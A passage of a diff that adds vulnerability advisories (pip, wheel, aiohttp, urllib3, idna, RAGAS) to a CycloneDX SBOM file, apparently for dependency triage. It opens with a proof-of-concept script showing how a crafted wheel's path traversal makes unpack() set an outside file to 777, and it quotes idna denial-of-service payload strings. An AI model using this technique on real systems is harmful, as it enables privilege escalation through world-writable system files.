setuptools._vendor.wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from setuptools\") except ImportError:     from wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from wheel\")  # 1. Setup Target (Read-Only system file simulation) target = Path(\"poc_target.txt\") target.write_text(\"SENSITIVE CONFIG\") target.chmod(0o400) # Read-only print(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")  # 2. Run Vulnerable Unpack # The wheel contains \"../../poc_target.txt\". # unpack() will extract safely, BUT chmod() will hit the actual target file. try:     unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\") except Exception as e:     print(f\"[!] Ignored expected extraction error: {e}\")  # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f\"[*] Final Perms: {final_perms}\")  if final_perms == \"777\":     print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\") else:     print(\"[-] Attack failed.\") ```    **result:**   <img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />      ### Impact   Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.    ### Recommended Fix   The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().    ### Suggested Patch:   ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination)  # Only apply chmod if a file was actually written if extracted_path:     permissions = zinfo.external_attr >> 16 & 0o777     Path(extracted_path).chmod(permissions) ```",
+      "id": "CVE-2026-24049",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5556184671098441.14923768708012064"
+        }
+      ],
+      "bom-ref": "BomRef.3525044167419702.7602272127207641",
+      "description": "pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both.",
+      "id": "CVE-2026-3219",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.8816560678213072.23204272929621228"
+        }
+      ],
+      "bom-ref": "BomRef.41057868976137035.47603803579980497",
+      "description": "### Summary  Using ``CookieJar.load()`` with untrusted input may allow arbitrary code execution.  ### Impact  Most applications using this function will be doing so with the user's own data, so this is unlikely to affect many applications.  ### Workaround  If an application does allow attacker controlled files to be loaded, a workaround on older releases would be to sanitise the files before loading.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dcf40f30637e8752c76781cf6703b5a236749a00",
+      "id": "CVE-2026-34993",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.9687249367495939.1447691742833228"
+        }
+      ],
+      "bom-ref": "BomRef.41798540399270956.8881194844342885",
+      "description": "This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. Payloads such as `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process.  ### Impact A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service.  ### Patches Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support).  ### Workarounds Domain names cannot exceed 253 characters in length, if this length limit is enforced prior to passing the domain to the `idna.encode()` function it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.",
+      "id": "CVE-2026-45409",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.8816560678213072.23204272929621228"
+        }
+      ],
+      "bom-ref": "BomRef.9831804921211403.4956170565962934",
+      "description": "### Summary  Cookies set with the `cookies` parameter on requests are sent after following a cross-origin redirect.  ### Impact  If a developer uses the `cookies` parameter on a per-request basis then sensitive data might be leaked to an attacker if they manage to control a redirect.  ### Workaround  If unable to upgrade, using a `Cookie` header in the `headers` parameter is not vulnerable.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/f54c40851b0d6c4bbdab97ba518a223adda32478",
+      "id": "CVE-2026-47265",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5556184671098441.14923768708012064"
+        }
+      ],
+      "bom-ref": "BomRef.07686715794726695.6004696656083743",
+      "description": "pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.",
+      "id": "CVE-2026-6357",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5810476887023769.930196477753474"
+        }
+      ],
+      "bom-ref": "BomRef.5738974534217917.3199037605588001",
+      "description": "A security flaw has been discovered in vibrantlabsai RAGAS up to 0.4.3. The affected element is the function _try_process_local_file/_try_process_url of the file src/ragas/metrics/collections/multi_modal_faithfulness/util.py of the component Collections Module. Performing a manipulation of the argument retrieved_contexts results in server-side request forgery. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The security patch for CVE-2025-45691 was applied to a different module only. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-6587",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5250143275322442.22358873815678704"
+        }
+      ],
+      "bom-ref": "BomRef.9970385315322959.6072173542257198",
+      "description": "urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.",
+      "id": "PYSEC-2026-141",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    },
+    {
+      "affects": [
+        {
+          "ref": "BomRef.5556184671098441.14923768708012064"
+        }
+      ],
+      "bom-ref": "BomRef.4567851425877951.06725432133607945",
+      "description": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory.",
+      "id": "PYSEC-2026-196",
+      "recommendation": "Upgrade",
+      "analysis": {
+        "state": "in_triage",
+        "detail": "",
+        "response": []
+      }
+    }
+  ],
+  "$schema": "http://cyclonedx.org/schema/bom-1.4.schema.json",
+  "bomFormat": "CycloneDX",
+  "specVersion": "1.4"
+}
